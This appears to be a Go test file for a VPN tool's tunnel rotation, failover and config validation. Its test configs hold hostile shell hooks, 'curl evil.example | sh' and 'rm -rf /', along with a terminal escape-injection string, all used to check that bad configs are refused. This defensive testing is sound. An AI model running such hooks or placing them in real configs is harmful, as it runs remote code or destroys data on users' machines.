// Copyright VPNW.com 2026
// SPDX-License-Identifier: Apache-2.0

package path_test

import (
	"bufio"
	"context"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/VPNWorks/vpnw/internal/events"
	"github.com/VPNWorks/vpnw/internal/path"
	"github.com/VPNWorks/vpnw/internal/path/wgtest"
)

// source hands over its configs in order, going round, the way the rotate
// plugin does: after the config a query is about, or after the one in use.
type source struct {
	mu     sync.Mutex
	list   []path.TunnelOffer
	asked  []path.TunnelQuery
	none   string // say there is nothing to give, and why
	failAt int    // fail on this call, counting from 1
}

func (s *source) Name() string { return "test" }

func (s *source) Next(ctx context.Context, q path.TunnelQuery) (*path.TunnelOffer, string, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.asked = append(s.asked, q)
	if s.failAt > 0 && len(s.asked) >= s.failAt {
		return nil, "", errors.New("source broke")
	}
	if s.none != "" || len(s.list) == 0 {
		return nil, s.none, nil
	}
	after := q.Config
	if after == "" {
		after = q.Current
	}
	i := 0
	for j, o := range s.list {
		if o.Name == after {
			i = (j + 1) % len(s.list)
		}
	}
	o := s.list[i]
	return &o, "", nil
}

func (s *source) reasons() string {
	s.mu.Lock()
	defer s.mu.Unlock()
	var r []string
	for _, q := range s.asked {
		x := q.Reason
		if q.Config != "" {
			x += " " + q.Config
		}
		r = append(r, x)
	}
	return strings.Join(r, ", ")
}

func named(t *testing.T, name string) *wgtest.Server {
	t.Helper()
	s, err := wgtest.StartNamed(name)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(s.Close)
	return s
}

// shorten sets a variable for one test.
func shorten(t *testing.T, v *time.Duration, d time.Duration) {
	old := *v
	*v = d
	t.Cleanup(func() { *v = old })
}

func up(t *testing.T, src *source) *path.Tunnels {
	t.Helper()
	p := &path.Tunnels{Name: "rotating", Source: src}
	t.Cleanup(func() { p.Close() })
	ctx, cancel := context.WithTimeout(context.Background(), time.Minute)
	defer cancel()
	if err := p.Health(ctx); err != nil {
		t.Fatal(err)
	}
	return p
}

// recorder keeps the path's events.
type recorder struct {
	mu  sync.Mutex
	evs []events.Event
}

func (r *recorder) emit(typ string, f map[string]any) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.evs = append(r.evs, events.Event{Type: typ, Fields: f})
}

func (r *recorder) of(typ string) []events.Event {
	r.mu.Lock()
	defer r.mu.Unlock()
	var out []events.Event
	for _, e := range r.evs {
		if e.Type == typ {
			out = append(out, e)
		}
	}
	return out
}

// fetch asks the web server inside the tunnel for its page, through the
// path, and returns the answer's body and the config that carried it.
func fetch(t *testing.T, p path.Path) (string, string) {
	t.Helper()
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	ips, err := p.(path.PathResolver).Resolver().LookupIP(ctx, "web.tunnel.test")
	if err != nil {
		t.Fatalf("lookup: %v", err)
	}
	ci := &path.Conn{}
	c, err := p.Dial(path.WithConn(ctx, ci), "web.tunnel.test", ips[0], 80)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer c.Close()
	c.SetDeadline(time.Now().Add(5 * time.Second))
	fmt.Fprintf(c, "GET / HTTP/1.0\r\nHost: web.tunnel.test\r\n\r\n")
	b, err := io.ReadAll(c)
	if err != nil {
		t.Fatalf("read: %v", err)
	}
	_, body, _ := strings.Cut(string(b), "\r\n\r\n")
	return strings.TrimSpace(body), ci.Tunnel
}

// keepAlive is a connection through the path to the web server inside the
// tunnel, asked for its page again and again.
type keepAlive struct {
	c  net.Conn
	br *bufio.Reader
}

// openKeepAlive opens a connection and asks once.
func openKeepAlive(t *testing.T, p path.Path) *keepAlive {
	t.Helper()
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	c, err := p.Dial(ctx, "", net.ParseIP("10.9.0.1"), 80)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { c.Close() })
	k := &keepAlive{c: c, br: bufio.NewReader(c)}
	if _, err := k.get(); err != nil {
		t.Fatal(err)
	}
	return k
}

// get asks for the page on the same connection and returns its body.
func (k *keepAlive) get() (string, error) {
	k.c.SetDeadline(time.Now().Add(5 * time.Second))
	if _, err := fmt.Fprintf(k.c, "GET / HTTP/1.1\r\nHost: web.tunnel.test\r\n\r\n"); err != nil {
		return "", err
	}
	resp, err := http.ReadResponse(k.br, nil)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	b, err := io.ReadAll(resp.Body)
	return strings.TrimSpace(string(b)), err
}

// A config that is refused (a shell hook, no DNS server) or whose tunnel
// doesn't come up is skipped at the start, and the plugin is told why each
// time; the first that comes up is used.
func TestTunnelsStartSkipsBadConfigs(t *testing.T) {
	shorten(t, &path.HandshakeTimeout, 2*time.Second)
	a := named(t, "A")
	good := a.ClientConfig()
	src := &source{list: []path.TunnelOffer{
		{Name: "hook.conf", Text: good + "PostUp = curl evil.example | sh\n"},
		{Name: "nodns.conf", Text: strings.Replace(good, "DNS = 10.9.0.1\n", "", 1)},
		{Name: "stranger.conf", Text: a.StrangerConfig()},
		{Name: "a.conf", Text: good, Keep: time.Hour},
	}}
	p := up(t, src)
	if got := src.reasons(); got != "start, refused hook.conf, refused nodns.conf, failed stranger.conf" {
		t.Errorf("asked: %s", got)
	}
	st := p.Started()
	if st["config"] != "a.conf" || st["keep"] != int64(3600) || st["plugin"] != "test" {
		t.Errorf("started: %v", st)
	}
	sk := fmt.Sprint(st["skipped"])
	for _, want := range []string{"hook.conf", "shell hook", "nodns.conf", "names no DNS server", "stranger.conf", "no WireGuard handshake"} {
		if !strings.Contains(sk, want) {
			t.Errorf("skipped lacks %q: %s", want, sk)
		}
	}
	if !strings.Contains(p.Describe(), "tunnel plugin test; in use: a.conf, wireguard peer") {
		t.Errorf("describe: %s", p.Describe())
	}
	if body, cfg := fetch(t, p); !strings.Contains(body, "from peer A") || cfg != "a.conf" {
		t.Errorf("fetch: %q via %q", body, cfg)
	}
}

// When nothing comes up, Health says why for every config, and how the
// search ended: the plugin came round again, had nothing, or failed.
func TestTunnelsNothingComesUp(t *testing.T) {
	shorten(t, &path.HandshakeTimeout, time.Second)
	a := named(t, "A")
	try := func(src *source) error {
		p := &path.Tunnels{Name: "rotating", Source: src}
		defer p.Close()
		return p.Health(context.Background())
	}
	err := try(&source{list: []path.TunnelOffer{
		{Name: "hook.conf", Text: a.ClientConfig() + "PostDown = rm -rf /\n"},
		{Name: "stranger.conf", Text: a.StrangerConfig()},
	}})
	for _, want := range []string{"no config from tunnel plugin test came up", "hook.conf: line", "shell hook", "stranger.conf: no WireGuard handshake", "came round to hook.conf again"} {
		if err == nil || !strings.Contains(err.Error(), want) {
			t.Errorf("%v lacks %q", err, want)
		}
	}
	if err := try(&source{none: "no .conf files in /tmp/x"}); err == nil || !strings.Contains(err.Error(), "the plugin has no config: no .conf files in /tmp/x") {
		t.Errorf("none: %v", err)
	}
	if err := try(&source{failAt: 1}); err == nil || !strings.Contains(err.Error(), "tunnel plugin test stopped: source broke") {
		t.Errorf("failing source: %v", err)
	}
	// A plugin that hands over anything at all, endlessly, is tried
	// TunnelTries times.
	var list []path.TunnelOffer
	for i := range 20 {
		list = append(list, path.TunnelOffer{Name: fmt.Sprintf("bad%d.conf", i), Text: "nonsense"})
	}
	src := &source{list: list}
	if err := try(src); err == nil || !strings.Contains(err.Error(), fmt.Sprintf("tried %d configs", path.TunnelTries)) || len(src.asked) != path.TunnelTries {
		t.Errorf("endless: %v, asked %d times", err, len(src.asked))
	}
}

// Rotation: the next config's tunnel comes up, new connections go through
// it, and a connection already open carries on through the old one until
// it closes; then the old tunnel closes.
func TestTunnelsRotate(t *testing.T) {
	a, b := named(t, "A"), named(t, "B")
	src := &source{list: []path.TunnelOffer{{Name: "a.conf", Text: a.ClientConfig()}, {Name: "b.conf", Text: b.ClientConfig()}}}
	p := up(t, src)
	rec := &recorder{}
	p.Start(rec.emit)
	if body, cfg := fetch(t, p); !strings.Contains(body, "from peer A") || cfg != "a.conf" {
		t.Fatalf("before: %q via %q", body, cfg)
	}
	// A download that is still going when the path moves on.
	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
	defer cancel()
	long, err := p.Dial(ctx, "", net.ParseIP("10.9.0.1"), 80)
	if err != nil {
		t.Fatal(err)
	}
	fmt.Fprintf(long, "GET /big HTTP/1.0\r\n\r\n")
	br := bufio.NewReader(long)
	if _, err := io.ReadFull(br, make([]byte, 64<<10)); err != nil {
		t.Fatal(err)
	}

	p.MoveNow("due")
	if p.Current() != "b.conf" {
		t.Fatalf("in use after rotation: %s", p.Current())
	}
	sw := rec.of(events.TunnelSwitch)
	if len(sw) != 1 || sw[0].Fields["from"] != "a.conf" || sw[0].Fields["to"] != "b.conf" || sw[0].Fields["why"] != "due" || sw[0].Fields["error"] != nil {
		t.Errorf("switch events: %v", sw)
	}
	if body, cfg := fetch(t, p); !strings.Contains(body, "from peer B") || cfg != "b.conf" {
		t.Errorf("after: %q via %q", body, cfg)
	}
	// The download finishes through A, and A closes only after it.
	p.CloseDrained()
	if p.Open() != 2 || len(rec.of(events.TunnelClose)) != 0 {
		t.Fatalf("A closed with a connection still on it: %d open", p.Open())
	}
	rest, err := io.Copy(io.Discard, br)
	if err != nil || rest < wgtest.BigSize-(64<<10) {
		t.Fatalf("the download through the old tunnel: %d bytes, %v", rest, err)
	}
	long.Close()
	p.CloseDrained()
	if cl := rec.of(events.TunnelClose); len(cl) != 1 || cl[0].Fields["config"] != "a.conf" || cl[0].Fields["why"] != "drained" || p.Open() != 1 {
		t.Errorf("close events %v, %d open", cl, p.Open())
	}
	// And round again to A.
	p.MoveNow("due")
	if body, cfg := fetch(t, p); !strings.Contains(body, "from peer A") || cfg != "a.conf" {
		t.Errorf("round again: %q via %q", body, cfg)
	}
	if got := src.reasons(); got != "start, due, due" {
		t.Errorf("asked: %s", got)
	}
}

// Round again to a config whose tunnel still carries connections: that
// tunnel is moved back to, not brought up anew, so its connections carry
// on. A second tunnel with the same key would take the peer from it, and
// they would stall.
func TestTunnelsRotateBackToDraining(t *testing.T) {
	a, b := named(t, "A"), named(t, "B")
	src := &source{list: []path.TunnelOffer{{Name: "a.conf", Text: a.ClientConfig()}, {Name: "b.conf", Text: b.ClientConfig()}}}
	p := up(t, src)
	rec := &recorder{}
	p.Start(rec.emit)
	// A download that has started, and a connection that asks now and then.
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	long, err := p.Dial(ctx, "", net.ParseIP("10.9.0.1"), 80)
	if err != nil {
		t.Fatal(err)
	}
	defer long.Close()
	fmt.Fprintf(long, "GET /big HTTP/1.0\r\n\r\n")
	br := bufio.NewReader(long)
	if _, err := io.ReadFull(br, make([]byte, 64<<10)); err != nil {
		t.Fatal(err)
	}
	ka := openKeepAlive(t, p)

	p.MoveNow("due") // to b
	p.MoveNow("due") // back to a, whose tunnel still carries both
	sw := rec.of(events.TunnelSwitch)
	if len(sw) != 2 || sw[1].Fields["to"] != "a.conf" || sw[1].Fields["again"] != true || sw[1].Fields["ms"] != int64(0) {
		t.Fatalf("switch events: %v", sw)
	}
	// b had no connection left: it closed at once.
	if cl := rec.of(events.TunnelClose); len(cl) != 1 || cl[0].Fields["config"] != "b.conf" || p.Open() != 1 {
		t.Errorf("close events %v, %d open", cl, p.Open())
	}
	if body, err := ka.get(); err != nil || !strings.Contains(body, "from peer A") {
		t.Errorf("the connection that asks now and then, after a, b and a again: %q, %v", body, err)
	}
	long.SetReadDeadline(time.Now().Add(20 * time.Second))
	if rest, err := io.Copy(io.Discard, br); err != nil || rest < wgtest.BigSize-(64<<10) {
		t.Errorf("the download, after a, b and a again: %d of %d bytes, %v", rest, wgtest.BigSize-(64<<10), err)
	}
	if body, cfg := fetch(t, p); !strings.Contains(body, "from peer A") || cfg != "a.conf" {
		t.Errorf("a new connection: %q via %q", body, cfg)
	}
	if got := src.reasons(); got != "start, due, due" {
		t.Errorf("asked: %s", got)
	}
}

// Two configs with the same key and peer can't both be up. One handed over
// while the other is in use is refused; one that comes up while the other
// is rotated out takes its place, and the old tunnel is closed with its
// connections, which would only stall.
func TestTunnelsSamePeer(t *testing.T) {
	a, b := named(t, "A"), named(t, "B")
	src := &source{list: []path.TunnelOffer{
		{Name: "a.conf", Text: a.ClientConfig()},
		{Name: "a-copy.conf", Text: a.ClientConfig()},
		{Name: "b.conf", Text: b.ClientConfig()},
		{Name: "a-again.conf", Text: "# the same, written again\n" + a.ClientConfig()},
	}}
	p := up(t, src)
	rec := &recorder{}
	p.Start(rec.emit)
	ka := openKeepAlive(t, p)
	p.MoveNow("due")
	if p.Current() != "b.conf" {
		t.Fatalf("in use: %s", p.Current())
	}
	te := rec.of(events.TunnelError)
	if len(te) != 1 || te[0].Fields["config"] != "a-copy.conf" || !strings.Contains(fmt.Sprint(te[0].Fields["error"]), "same private key and peer as a.conf") {
		t.Errorf("errors: %v", te)
	}
	if got := src.reasons(); got != "start, due, refused a-copy.conf" {
		t.Errorf("asked: %s", got)
	}
	p.MoveNow("due") // to a-again.conf: a's tunnel, with ka on it, makes way
	if p.Current() != "a-again.conf" {
		t.Fatalf("in use: %s", p.Current())
	}
	cl := rec.of(events.TunnelClose)
	if len(cl) != 2 || cl[0].Fields["config"] != "a.conf" || cl[0].Fields["why"] != "replaced" || cl[0].Fields["by"] != "a-again.conf" || cl[0].Fields["cut"] != 1 {
		t.Errorf("close events: %v", cl)
	}
	if _, err := ka.get(); err == nil || isDeadline(err) {
		t.Errorf("a connection of the replaced tunnel: %v, want closed", err)
	}
	if body, cfg := fetch(t, p); !strings.Contains(body, "from peer A") || cfg != "a-again.conf" {
		t.Errorf("after: %q via %q", body, cfg)
	}
}

// Two tunnels can't listen on one port: a config whose ListenPort another
// tunnel holds is refused, and says so.
func TestTunnelsListenPortTaken(t *testing.T) {
	a, b := named(t, "A"), named(t, "B")
	pc, err := net.ListenPacket("udp4", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	port := pc.LocalAddr().(*net.UDPAddr).Port
	pc.Close()
	at := func(conf string) string {
		return strings.Replace(conf, "[Interface]\n", "[Interface]\nListenPort = "+strconv.Itoa(port)+"\n", 1)
	}
	src := &source{list: []path.TunnelOffer{{Name: "a.conf", Text: at(a.ClientConfig())}, {Name: "b.conf", Text: at(b.ClientConfig())}}}
	p := up(t, src)
	rec := &recorder{}
	p.Start(rec.emit)
	p.MoveNow("due")
	te := rec.of(events.TunnelError)
	if p.Current() != "a.conf" || len(te) != 1 || !strings.Contains(fmt.Sprint(te[0].Fields["error"]), fmt.Sprintf("its ListenPort %d is taken by the tunnel of a.conf", port)) {
		t.Errorf("in use %s; errors %v", p.Current(), te)
	}
}

// Errors about a config go to the record, the console, and back to the
// plugin. None shows a key from a mistyped line, draws on the terminal, or
// runs long; and what the plugin is told of a tunnel that didn't come up
// says no more than its config: not where its endpoint's name led.
func TestTunnelsConfigErrors(t *testing.T) {
	shorten(t, &path.HandshakeTimeout, time.Second)
	a := named(t, "A")
	good := a.ClientConfig()
	var key string
	for _, l := range strings.Split(good, "\n") {
		if v, ok := strings.CutPrefix(l, "PrivateKey = "); ok {
			key = strings.TrimSuffix(v, "=")
		}
	}
	var peers strings.Builder
	for range path.MaxTunnelPeers {
		peers.WriteString("\n[Peer]\nPublicKey = xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=\nEndpoint = 127.0.0.1:9\nAllowedIPs = 10.0.0.0/8\n")
	}
	stranger := strings.Replace(a.StrangerConfig(), "Endpoint = 127.0.0.1:", "Endpoint = localhost:", 1)
	src := &source{list: []path.TunnelOffer{
		{Name: "typo.conf", Text: strings.Replace(good, "PrivateKey = ", "PrivateKey: ", 1)},
		{Name: "escape.conf", Text: "[Interface]\n\x1b[2K\rvpnw 00:00:00.000  FAKE\x1b[8m = 1\n"},
		{Name: "long.conf", Text: "[Interface]\n" + strings.Repeat("x", 60<<10) + " = 1\n"},
		{Name: "peers.conf", Text: good + peers.String()},
		{Name: "stranger.conf", Text: stranger},
		{Name: "a.conf", Text: good},
	}}
	p := up(t, src)
	sk, _ := p.Started()["skipped"].([]any)
	if len(sk) != 5 {
		t.Fatalf("skipped %v", sk)
	}
	var told []string
	src.mu.Lock()
	for _, q := range src.asked[1:] {
		told = append(told, q.Error)
	}
	src.mu.Unlock()
	for i, x := range sk {
		e := fmt.Sprint(x.(map[string]any)["error"])
		for _, s := range []string{e, told[i]} {
			if strings.Contains(s, key[:12]) || strings.ContainsAny(s, "\x1b\r\n") || len(s) > 450 {
				t.Errorf("%q", s)
			}
		}
	}
	if e := fmt.Sprint(sk[3].(map[string]any)["error"]); !strings.Contains(e, fmt.Sprintf("it has %d peers", path.MaxTunnelPeers+1)) {
		t.Errorf("peers.conf: %s", e)
	}
	// The record says where the handshakes went; the plugin is told the
	// endpoint as its config has it.
	if e := fmt.Sprint(sk[4].(map[string]any)["error"]); !strings.Contains(e, "no WireGuard handshake from 127.0.0.1:") {
		t.Errorf("recorded: %s", e)
	}
	if !strings.HasPrefix(told[4], "no WireGuard handshake from localhost:") || strings.Contains(told[4], "127.0.0.1") {
		t.Errorf("told: %s", told[4])
	}
	if got := path.ToPlugin("failed", &path.LookupError{Endpoint: "x.example:51820", Err: errors.New("lookup x.example on 192.0.2.53:53: no such host")}); got != "cannot look up the name in endpoint x.example:51820" {
		t.Errorf("lookup: %s", got)
	}
	if got := path.ToPlugin("failed", errors.New("wireguard: listen udp4 :51820: bind: address already in use")); got != "its tunnel didn't start" {
		t.Errorf("other: %s", got)
	}
}

// The tunnel in use stops answering: vpnw notices on its own, asks for
// another config, and moves to it; the record says why.
func TestTunnelsFailover(t *testing.T) {
	shorten(t, &path.TunnelSilence, 2*time.Second)
	a, b := named(t, "A"), named(t, "B")
	relay, err := wgtest.NewRelay(a.Port)
	if err != nil {
		t.Fatal(err)
	}
	defer relay.Close()
	src := &source{list: []path.TunnelOffer{{Name: "a.conf", Text: a.ConfigVia(relay)}, {Name: "b.conf", Text: b.ClientConfig()}}}
	p := up(t, src)
	rec := &recorder{}
	p.Start(rec.emit)
	if body, _ := fetch(t, p); !strings.Contains(body, "from peer A") {
		t.Fatalf("before: %q", body)
	}
	relay.Silence(true)
	// Something has to go out for the silence to count.
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	if c, err := p.Dial(ctx, "", net.ParseIP("10.9.0.1"), 80); err == nil {
		c.Close()
		t.Error("a connection opened through a silent peer")
	}
	cancel()
	deadline := time.Now().Add(15 * time.Second)
	for p.Current() != "b.conf" && time.Now().Before(deadline) {
		time.Sleep(100 * time.Millisecond)
	}
	sw := rec.of(events.TunnelSwitch)
	if len(sw) != 1 || sw[0].Fields["why"] != "failed" || !strings.Contains(fmt.Sprint(sw[0].Fields["error"]), "nothing came back through it") {
		t.Fatalf("switch events: %v (in use: %s)", sw, p.Current())
	}
	if body, cfg := fetch(t, p); !strings.Contains(body, "from peer B") || cfg != "b.conf" {
		t.Errorf("after: %q via %q", body, cfg)
	}
	if got := src.reasons(); got != "start, failed a.conf" {
		t.Errorf("asked: %s", got)
	}
}

// With nothing else to go to, the silent tunnel stays: nothing goes around
// it, and it works again when the peer comes back.
func TestTunnelsSilentWithNowhereToGo(t *testing.T) {
	shorten(t, &path.TunnelSilence, 2*time.Second)
	a := named(t, "A")
	relay, err := wgtest.NewRelay(a.Port)
	if err != nil {
		t.Fatal(err)
	}
	defer relay.Close()
	src := &source{list: []path.TunnelOffer{{Name: "a.conf", Text: a.ConfigVia(relay)}}}
	p := up(t, src)
	rec := &recorder{}
	p.Start(rec.emit)
	relay.Silence(true)
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	if c, err := p.Dial(ctx, "", net.ParseIP("10.9.0.1"), 80); err == nil {
		c.Close()
	}
	cancel()
	deadline := time.Now().Add(10 * time.Second)
	for !strings.Contains(src.reasons(), "failed a.conf") && time.Now().Before(deadline) {
		time.Sleep(100 * time.Millisecond)
	}
	if !strings.Contains(src.reasons(), "failed a.conf") || p.Current() != "a.conf" || len(rec.of(events.TunnelSwitch)) != 0 {
		t.Fatalf("asked %s; in use %s; switches %v", src.reasons(), p.Current(), rec.of(events.TunnelSwitch))
	}
	// The record says it stopped answering and stays.
	time.Sleep(100 * time.Millisecond)
	if te := rec.of(events.TunnelError); len(te) < 1 || te[0].Fields["config"] != nil ||
		te[0].Fields["error"] != "a.conf stopped answering (nothing came back through it for 2s); the plugin handed it back, so it stays in use" {
		t.Errorf("errors: %v", te)
	}
	relay.Silence(false)
	if body, _ := fetch(t, p); !strings.Contains(body, "from peer A") {
		t.Errorf("after the peer came back: %q", body)
	}
}

// A source that fails is not asked again; the tunnel in use stays, and the
// record says so.
func TestTunnelsSourceFailsMidRun(t *testing.T) {
	a, b := named(t, "A"), named(t, "B")
	src := &source{failAt: 2, list: []path.TunnelOffer{{Name: "a.conf", Text: a.ClientConfig()}, {Name: "b.conf", Text: b.ClientConfig()}}}
	p := up(t, src)
	rec := &recorder{}
	p.Start(rec.emit)
	p.MoveNow("due")
	p.MoveNow("due")
	errs := rec.of(events.TunnelError)
	if len(errs) != 2 || !strings.Contains(fmt.Sprint(errs[0].Fields["error"]), "tunnel plugin test stopped: source broke; a.conf stays in use") ||
		!strings.Contains(fmt.Sprint(errs[1].Fields["error"]), "has stopped") {
		t.Errorf("errors: %v", errs)
	}
	if len(src.asked) != 2 {
		t.Errorf("a failed source was asked again: %s", src.reasons())
	}
	if body, cfg := fetch(t, p); !strings.Contains(body, "from peer A") || cfg != "a.conf" {
		t.Errorf("after: %q via %q", body, cfg)
	}
}

// Rotating out keeps at most MaxDraining tunnels with connections; the
// oldest is closed with its connections when another would join them. A
// tunnel left with no connections closes at once and doesn't count.
func TestTunnelsDrainingLimit(t *testing.T) {
	var list []path.TunnelOffer
	for i := range path.MaxDraining + 3 {
		s := named(t, strconv.Itoa(i))
		list = append(list, path.TunnelOffer{Name: fmt.Sprintf("a%d.conf", i), Text: s.ClientConfig()})
	}
	p := up(t, &source{list: list})
	rec := &recorder{}
	p.Start(rec.emit)
	var ka []*keepAlive
	for range path.MaxDraining {
		ka = append(ka, openKeepAlive(t, p))
		p.MoveNow("due")
	}
	// The one in use has no connection; moving on from it cuts nothing.
	p.MoveNow("due")
	if cl := rec.of(events.TunnelClose); len(cl) != 1 || cl[0].Fields["config"] != fmt.Sprintf("a%d.conf", path.MaxDraining) || cl[0].Fields["why"] != "drained" {
		t.Fatalf("close events after leaving an idle tunnel: %v", cl)
	}
	ka = append(ka, openKeepAlive(t, p))
	p.MoveNow("due")
	cl := rec.of(events.TunnelClose)
	if len(cl) != 2 || cl[1].Fields["config"] != "a0.conf" || cl[1].Fields["why"] != "limit" || cl[1].Fields["cut"] != 1 {
		t.Fatalf("close events: %v", cl)
	}
	if p.Open() != path.MaxDraining+1 {
		t.Errorf("%d tunnels open", p.Open())
	}
	if _, err := ka[0].get(); err == nil || isDeadline(err) {
		t.Errorf("a connection of the cut tunnel: %v, want closed", err)
	}
	for i, k := range ka[1:] {
		if body, err := k.get(); err != nil || !strings.Contains(body, "hello through the tunnel") {
			t.Errorf("connection %d, still draining: %q, %v", i+1, body, err)
		}
	}
}

func isDeadline(err error) bool {
	var ne net.Error
	return errors.As(err, &ne) && ne.Timeout()
}

// After Close nothing dials, and nothing falls back to anything else.
func TestTunnelsClosed(t *testing.T) {
	a := named(t, "A")
	p := up(t, &source{list: []path.TunnelOffer{{Name: "a.conf", Text: a.ClientConfig()}}})
	p.Close()
	if _, err := p.Dial(context.Background(), "", net.ParseIP("10.9.0.1"), 80); err == nil {
		t.Error("dialled after Close")
	}
	if _, err := p.Resolver().LookupIP(context.Background(), "web.tunnel.test"); err == nil {
		t.Error("looked up after Close")
	}
	var none path.Tunnels
	none.Source = &source{}
	if _, err := none.Dial(context.Background(), "", net.ParseIP("10.9.0.1"), 80); err == nil || !strings.Contains(err.Error(), "no tunnel is up") {
		t.Errorf("before Health: %v", err)
	}
}

// Silent: data out and nothing back for longer than d. Keepalives alone
// don't count, since a peer never answers them.
func TestWireGuardSilent(t *testing.T) {
	a := named(t, "A")
	relay, err := wgtest.NewRelay(a.Port)
	if err != nil {
		t.Fatal(err)
	}
	defer relay.Close()
	w := tunnel(t, strings.Replace(a.ConfigVia(relay), "AllowedIPs", "PersistentKeepalive = 1\nAllowedIPs", 1), "")
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	if err := w.Health(ctx); err != nil {
		t.Fatal(err)
	}
	relay.Silence(true)
	// Only keepalives go out: never silent. (A connection closing would
	// send its last packets too, which a live peer answers with a
	// keepalive within 10 seconds; with d of a second, they would count.)
	for range 15 {
		if w.Silent(time.Second) {
			t.Fatal("silent on keepalives alone")
		}
		time.Sleep(200 * time.Millisecond)
	}
	dctx, dcancel := context.WithTimeout(context.Background(), 2*time.Second)
	if c, err := w.Dial(dctx, "", net.ParseIP("10.9.0.1"), 80); err == nil {
		c.Close()
	}
	dcancel()
	silent := false
	for range 15 {
		if silent = w.Silent(time.Second); silent {
			break
		}
		time.Sleep(200 * time.Millisecond)
	}
	if !silent {
		t.Fatal("not silent after a connection went unanswered")
	}
	relay.Silence(false)
	if body, _ := fetch(t, w); !strings.Contains(body, "from peer A") {
		t.Fatalf("after: %q", body)
	}
	if w.Silent(time.Second) {
		t.Error("still silent after the peer answered")
	}
}

// Packets forged to look like a peer's don't hide a peer that is gone:
// only what WireGuard accepts counts as heard.
func TestWireGuardSilentForged(t *testing.T) {
	a := named(t, "A")
	relay, err := wgtest.NewRelay(a.Port)
	if err != nil {
		t.Fatal(err)
	}
	defer relay.Close()
	pc, err := net.ListenPacket("udp4", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	port := pc.LocalAddr().(*net.UDPAddr).Port
	pc.Close()
	w := tunnel(t, strings.Replace(a.ConfigVia(relay), "[Interface]\n", "[Interface]\nListenPort = "+strconv.Itoa(port)+"\n", 1), "")
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	if err := w.Health(ctx); err != nil {
		t.Fatal(err)
	}
	relay.Silence(true)
	// Someone sends what looks like a keepalive, and handshakes, every 100 ms.
	u, err := net.Dial("udp4", "127.0.0.1:"+strconv.Itoa(port))
	if err != nil {
		t.Fatal(err)
	}
	defer u.Close()
	done := make(chan struct{})
	defer close(done)
	go func() {
		keepalive, response := make([]byte, 32), make([]byte, 92)
		keepalive[0], response[0] = 4, 2
		for {
			select {
			case <-done:
				return
			case <-time.After(100 * time.Millisecond):
				u.Write(keepalive)
				u.Write(response)
			}
		}
	}()
	dctx, dcancel := context.WithTimeout(context.Background(), 2*time.Second)
	if c, err := w.Dial(dctx, "", net.ParseIP("10.9.0.1"), 80); err == nil {
		c.Close()
	}
	dcancel()
	silent := false
	for range 25 {
		if silent = w.Silent(time.Second); silent {
			break
		}
		time.Sleep(200 * time.Millisecond)
	}
	if !silent {
		t.Fatal("not silent while forged packets came in")
	}
}

func TestUnicastData(t *testing.T) {
	v4 := func(proto byte, dst [4]byte) []byte {
		p := make([]byte, 20)
		p[0], p[9] = 0x45, proto
		copy(p[16:], dst[:])
		return p
	}
	v6 := func(next byte, dst string) []byte {
		p := make([]byte, 40)
		p[0], p[6] = 0x60, next
		copy(p[24:], net.ParseIP(dst).To16())
		return p
	}
	for _, c := range []struct {
		p    []byte
		want bool
	}{
		{v4(6, [4]byte{10, 9, 0, 1}), true},
		{v4(17, [4]byte{10, 9, 0, 1}), true},
		{v4(1, [4]byte{10, 9, 0, 1}), false},
		{v4(17, [4]byte{224, 0, 0, 251}), false},
		{v4(6, [4]byte{0, 0, 0, 0}), false},
		{v6(6, "2001:db8::1"), true},
		{v6(58, "ff02::2"), false},
		{v6(17, "ff02::fb"), false},
		{[]byte{0x45, 0, 0}, false},
		{nil, false},
	} {
		if got := path.UnicastData(c.p); got != c.want {
			t.Errorf("%x: %v", c.p, got)
		}
	}
}

func TestWGMessage(t *testing.T) {
	msg := func(typ byte, n int) []byte {
		p := make([]byte, n)
		p[0] = typ
		return p
	}
	for _, c := range []struct {
		p    []byte
		want bool
	}{
		{msg(1, 148), true},
		{msg(2, 92), true},
		{msg(3, 64), true},
		{msg(4, 32), true},
		{msg(4, 1452), true},
		{msg(1, 149), false},
		{msg(2, 148), false},
		{msg(4, 31), false},
		{msg(5, 64), false},
		{append([]byte{4, 1, 0, 0}, make([]byte, 40)...), false},
		{nil, false},
	} {
		if got := path.WGMessage(c.p); got != c.want {
			t.Errorf("type %v, %d bytes: %v", c.p, len(c.p), got)
		}
	}
}

// BenchmarkTunnelSwitch is one rotation: the next config's tunnel brought
// up, its handshake done, and new connections moved to it.
func BenchmarkTunnelSwitch(b *testing.B) {
	pa, err := wgtest.StartNamed("A")
	if err != nil {
		b.Fatal(err)
	}
	defer pa.Close()
	pb, err := wgtest.StartNamed("B")
	if err != nil {
		b.Fatal(err)
	}
	defer pb.Close()
	p := &path.Tunnels{Name: "bench", Source: &source{list: []path.TunnelOffer{{Name: "a.conf", Text: pa.ClientConfig()}, {Name: "b.conf", Text: pb.ClientConfig()}}}}
	defer p.Close()
	if err := p.Health(context.Background()); err != nil {
		b.Fatal(err)
	}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		before := p.Current()
		p.MoveNow("due")
		if p.Current() == before {
			b.Fatal("no switch")
		}
		p.CloseDrained()
	}
}
